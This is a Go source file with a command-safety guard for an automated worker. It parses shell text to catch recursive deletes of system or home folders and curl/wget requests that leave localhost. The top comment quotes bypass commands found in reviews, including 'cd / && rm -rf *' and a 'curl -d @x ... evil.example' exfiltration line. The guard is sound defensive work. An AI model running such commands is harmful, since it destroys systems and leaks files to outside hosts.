package safety

// The rules in safety.go read a command as text, so each review found a new spelling of the same command that got
// past them (round-5 recheck: "timeout 5 rm -rf /etc", "rm -rf ~/..", "cd / && rm -rf *", and "curl -d @x
// http://localhost:1 evil.example" taken as local because one of its two targets was). This file reads a command the
// way the shell splits it: simple commands, unquoted words, a "bash -c" script as commands of its own, "cd" moving
// where relative paths point. It is still a guard rail in front of the worker, not the approval gate.

import (
	"net/url"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strings"
)

// shellCommands splits a shell text into its simple commands, each as its unquoted words. Operators (; & | ( ) and a
// newline) end a command, and a substitution's opening ("$(", a backquote) starts one. An unclosed quote runs to the
// end of the text, as one word.
func shellCommands(text string) [][]string {
	var commands [][]string
	var current []string
	var word strings.Builder
	inWord := false
	endWord := func() {
		if inWord {
			current = append(current, word.String())
			word.Reset()
			inWord = false
		}
	}
	endCommand := func() {
		endWord()
		if len(current) > 0 {
			commands = append(commands, current)
		}
		current = nil
	}
	rs := []rune(text)
	for i := 0; i < len(rs); i++ {
		c := rs[i]
		switch {
		case c == '\\':
			if i+1 < len(rs) {
				i++
				if rs[i] != '\n' {
					word.WriteRune(rs[i])
					inWord = true
				}
			}
		case c == '\'':
			inWord = true
			for i++; i < len(rs) && rs[i] != '\''; i++ {
				word.WriteRune(rs[i])
			}
		case c == '"':
			inWord = true
			for i++; i < len(rs) && rs[i] != '"'; i++ {
				if rs[i] == '\\' && i+1 < len(rs) && strings.ContainsRune("$`\"\\\n", rs[i+1]) {
					i++
				}
				word.WriteRune(rs[i])
			}
		case c == '#' && !inWord:
			for i < len(rs) && rs[i] != '\n' {
				i++
			}
			endCommand()
		case c == ' ' || c == '\t' || c == '\r':
			endWord()
		case strings.ContainsRune(";&|()\n`", c):
			endCommand()
		case c == '$' && i+1 < len(rs) && rs[i+1] == '(':
			endCommand()
			i++
		default:
			word.WriteRune(c)
			inWord = true
		}
	}
	endCommand()
	return commands
}

// homeDir is the home the worker's commands run in.
func homeDir() string {
	if h := os.Getenv("HOME"); strings.HasPrefix(h, "/") {
		return path.Clean(h)
	}
	return "/home/headless"
}

var (
	homeWordRe  = regexp.MustCompile(`^(\$\{HOME\}|\$HOME|~)(/|$)`)
	otherHomeRe = regexp.MustCompile(`^~([a-z_][a-z0-9_-]*)(/|$)`)
	globRe      = regexp.MustCompile(`[*?\[]`)
	userHomeRe  = regexp.MustCompile(`^/home/[^/]+$|^/(usr|var|etc)/[^/]+$`)
)

// systemDirs are the top-level folders whose loss breaks the machine.
var systemDirs = map[string]bool{"/": true, "/bin": true, "/boot": true, "/dev": true, "/etc": true, "/home": true,
	"/lib": true, "/lib32": true, "/lib64": true, "/libx32": true, "/media": true, "/mnt": true, "/opt": true,
	"/proc": true, "/root": true, "/run": true, "/sbin": true, "/srv": true, "/sys": true, "/usr": true, "/var": true}

// resolveWord is the absolute path a word names from cwd, or "" when it is decided at run time.
func resolveWord(word, cwd, home string) string {
	p := homeWordRe.ReplaceAllString(word, home+"$2")
	if strings.HasPrefix(p, "~root") && (len(p) == 5 || p[5] == '/') {
		p = "/root" + p[5:]
	}
	p = otherHomeRe.ReplaceAllString(p, "/home/$1$2")
	if strings.ContainsAny(p, "$`") || strings.HasPrefix(p, "~") {
		return ""
	}
	if cwd == "" && !strings.HasPrefix(p, "/") {
		// The caller did not say where the command starts: only a relative path that climbs out of it ("..",
		// "../..") is read, as climbing from a folder inside the home.
		p = path.Join(home, "work", p)
	} else if !strings.HasPrefix(p, "/") {
		p = path.Join(cwd, p)
	}
	return path.Clean("/" + p)
}

// protectedPath reports whether deleting a resolved path (or all a glob in it matches) wipes the root, a system
// folder, a home or the worker's home.
func protectedPath(p, home string) bool {
	parts := strings.Split(p, "/")
	for i, part := range parts {
		if globRe.MatchString(part) {
			parent := strings.Join(parts[:i], "/")
			if parent == "" {
				parent = "/"
			}
			return protectedPath(parent, home)
		}
	}
	if systemDirs[p] || p == home || strings.HasPrefix(home, strings.TrimSuffix(p, "/")+"/") {
		return true
	}
	return userHomeRe.MatchString(p)
}

// rmWipes reports whether the rm at words[at] deletes, recursively, something protected.
func rmWipes(words []string, at int, cwd, home string) bool {
	recursive, done := false, false
	var operands []string
	for _, w := range words[at+1:] {
		switch {
		case !done && w == "--":
			done = true
		case !done && strings.HasPrefix(w, "--") && len(w) > 2:
			name := strings.SplitN(w, "=", 2)[0]
			recursive = recursive || strings.HasPrefix("--recursive", name)
		case !done && strings.HasPrefix(w, "-") && len(w) > 1:
			recursive = recursive || strings.ContainsAny(w, "rR")
		default:
			operands = append(operands, w)
		}
	}
	if !recursive {
		return false
	}
	for _, w := range operands {
		if p := resolveWord(w, cwd, home); p != "" && protectedPath(p, home) {
			return true
		}
	}
	return false
}

var shellNames = map[string]bool{"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true, "mksh": true,
	"ash": true, "busybox": true, "su": true}
var assignRe = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*=`)
var dashCRe = regexp.MustCompile(`^-[a-zA-Z]*c[a-zA-Z]*$`)

// startDir is the folder a command starts in, as resolveWord reads it: dir (the caller's working folder) made
// absolute, or "" when the caller did not say. A relative dir is where the caller's process runs it from.
func startDir(dir, home string) string {
	dir = strings.TrimSpace(dir)
	if dir == "" {
		return ""
	}
	if !strings.HasPrefix(dir, "/") && !homeWordRe.MatchString(dir) {
		wd, err := os.Getwd()
		if err != nil {
			return ""
		}
		dir = path.Join(filepath.ToSlash(wd), dir)
	}
	return resolveWord(dir, "/", home)
}

// wipeConcern reads a command word by word for a recursive delete of the root, a system folder or a home: rm named
// by any path, behind any wrapper (env, nohup, timeout, sudo...), inside a "bash -c" script, or on a relative path,
// read from cwd (the folder the command starts in; "" when not known) and every "cd" after it. Here-documents fed to
// a program other than a shell are its data and are not read.
func wipeConcern(command, cwd string, depth int) *Concern {
	if depth > 4 {
		return &Concern{Reason: "it nests shells too deeply to be checked before it runs"}
	}
	home := homeDir()
	for _, words := range shellCommands(blankHeredocs(command)) {
		for len(words) > 0 && assignRe.MatchString(words[0]) {
			words = words[1:]
		}
		if len(words) == 0 {
			continue
		}
		if words[0] == "cd" {
			target := "~"
			for _, w := range words[1:] {
				if w != "--" && !strings.HasPrefix(w, "-") {
					target = w
					break
				}
			}
			if p := resolveWord(target, cwd, home); p != "" {
				cwd = p
			}
			continue
		}
		for i, w := range words {
			name := path.Base(w)
			if name == "rm" && rmWipes(words, i, cwd, home) {
				return &Concern{Reason: "it recursively deletes a home, a system folder or the root directory"}
			}
			if shellNames[name] {
				for j := i + 1; j+1 < len(words); j++ {
					if dashCRe.MatchString(words[j]) {
						if c := wipeConcern(words[j+1], cwd, depth+1); c != nil {
							return c
						}
						break
					}
				}
			}
		}
	}
	return nil
}

// Options of curl and wget that take a value. A value given to an option not listed is read as a target if it looks
// like one: an unknown option fails closed, never open.
var curlValueShort = "AbcCdDeEFHKmoPQrtTuUwxXyYz"
var curlValueLong = map[string]bool{"data": true, "data-raw": true, "data-binary": true, "data-ascii": true,
	"data-urlencode": true, "json": true, "form": true, "form-string": true, "header": true, "request": true,
	"output": true, "user": true, "user-agent": true, "referer": true, "cookie": true, "cookie-jar": true,
	"upload-file": true, "write-out": true, "max-time": true, "connect-timeout": true, "retry": true,
	"retry-delay": true, "retry-max-time": true, "cacert": true, "capath": true, "cert": true, "key": true,
	"cert-type": true, "key-type": true, "pass": true, "range": true, "continue-at": true, "dump-header": true,
	"limit-rate": true, "max-filesize": true, "time-cond": true, "proxy-user": true, "oauth2-bearer": true,
	"aws-sigv4": true, "variable": true, "expect100-timeout": true, "keepalive-time": true, "interface": true,
	"local-port": true, "output-dir": true, "trace": true, "trace-ascii": true, "stderr": true, "ciphers": true,
	"tls-max": true, "unix-socket": true, "abstract-unix-socket": true, "hostpubmd5": true, "pinnedpubkey": true,
	"crlfile": true, "netrc-file": true, "service-name": true, "mail-from": true, "mail-rcpt": true,
	"mail-auth": true}

// Options whose value is where the request goes, or that send it somewhere the command does not name.
var curlRouteLong = map[string]bool{"url": true, "proxy": true, "preproxy": true, "socks4": true, "socks4a": true,
	"socks5": true, "socks5-hostname": true, "connect-to": true, "resolve": true, "config": true, "doh-url": true,
	"proxy1.0": true}
var wgetValueLong = map[string]bool{"post-data": true, "post-file": true, "body-data": true, "body-file": true,
	"method": true, "header": true, "output-document": true, "output-file": true, "append-output": true,
	"user": true, "password": true, "http-user": true, "http-password": true, "user-agent": true, "referer": true,
	"load-cookies": true, "save-cookies": true, "directory-prefix": true, "tries": true, "timeout": true,
	"wait": true, "level": true, "accept": true, "reject": true, "ca-certificate": true, "certificate": true,
	"private-key": true}
var wgetValueShort = "OoaDPtTwlARU"
var wgetRouteLong = map[string]bool{"input-file": true, "base": true, "execute": true, "config": true}
var wgetRouteShort = "iBe"

// localHosts are the names of this machine itself that a target may give as its host.
var localHosts = map[string]bool{"localhost": true, "127.0.0.1": true, "0.0.0.0": true, "::1": true}

// localTarget reports whether a curl or wget target is this machine, judged by the host net/url reads from it
// (Hostname: the authority without its user-info part or port), never by a pattern over the raw text (follow-up
// O-1.a.4). A target with no scheme is read as http's, as curl and wget read it. A target net/url cannot read as a
// URL with a host is not local.
func localTarget(target string) bool {
	raw := target
	if !strings.Contains(raw, "://") {
		raw = "http://" + raw
	}
	u, err := url.Parse(raw)
	if err != nil || u.Opaque != "" || u.Host == "" {
		return false
	}
	return localHosts[strings.ToLower(u.Hostname())]
}

// proxyRe finds a proxy or a config file named in a command or the environment: either can send a request somewhere
// other than the target it names.
var proxyRe = regexp.MustCompile(`(?i)proxy|curlrc|wgetrc|CURL_HOME|WGETRC|XDG_CONFIG_HOME|\.netrc`)

// onlyLocalTargets reports whether every curl and wget in a command sends only to this machine: each target is a
// local address, no proxy or config file is named, none is set in this process's environment, and no curl or wget
// config file in the home adds one. Anything it cannot read is not local.
func onlyLocalTargets(command string) bool {
	if proxyRe.MatchString(command) {
		return false
	}
	for _, kv := range os.Environ() {
		name, value, _ := strings.Cut(kv, "=")
		if value != "" && proxyRe.MatchString(name) && !strings.EqualFold(name, "no_proxy") {
			return false
		}
	}
	home := homeDir()
	for _, f := range []string{".curlrc", ".config/curlrc", ".wgetrc", ".netrc"} {
		if _, err := os.Stat(path.Join(home, f)); err == nil {
			return false
		}
	}
	seen := false
	for _, words := range shellCommands(blankHeredocs(command)) {
		for i, w := range words {
			name := path.Base(w)
			if name != "curl" && name != "wget" {
				continue
			}
			targets, ok := requestTargets(words[i+1:], name == "curl")
			if !ok {
				return false
			}
			for _, t := range targets {
				if !localTarget(t) {
					return false
				}
				seen = true
			}
		}
	}
	return seen
}

// requestTargets lists where a curl or wget's words send it; ok is false when an option routes it somewhere else or
// reads where to go from a file.
func requestTargets(words []string, curl bool) (targets []string, ok bool) {
	valueShort, valueLong, routeLong, routeShort := curlValueShort, curlValueLong, curlRouteLong, "x"
	if !curl {
		valueShort, valueLong, routeLong, routeShort = wgetValueShort, wgetValueLong, wgetRouteLong, wgetRouteShort
	}
	done := false
	for i := 0; i < len(words); i++ {
		w := words[i]
		switch {
		case done || !strings.HasPrefix(w, "-") || w == "-":
			targets = append(targets, w)
		case w == "--":
			done = true
		case strings.HasPrefix(w, "--"):
			name, value, hasValue := strings.Cut(w[2:], "=")
			if routeLong[name] {
				if name == "url" || name == "proxy" {
					if !hasValue && i+1 < len(words) {
						i++
						value = words[i]
					}
					targets = append(targets, value)
					continue
				}
				return nil, false
			}
			if hasValue || valueLong[name] {
				if !hasValue {
					i++
				}
				continue
			}
			// An option not known to take a value: if the next word looks like a target it is read as one.
		default:
			for k := 1; k < len(w); k++ {
				c := w[k]
				if strings.IndexByte(routeShort, c) >= 0 {
					if curl {
						value := w[k+1:]
						if value == "" && i+1 < len(words) {
							i++
							value = words[i]
						}
						targets = append(targets, value)
						break
					}
					return nil, false
				}
				if c == 'K' && curl {
					return nil, false
				}
				if strings.IndexByte(valueShort, c) >= 0 {
					if k == len(w)-1 {
						i++
					}
					break
				}
			}
		}
	}
	// Every other word is a target the program will try, whether or not it looks like an address.
	var out []string
	for _, t := range targets {
		if t != "" {
			out = append(out, t)
		}
	}
	return out, true
}
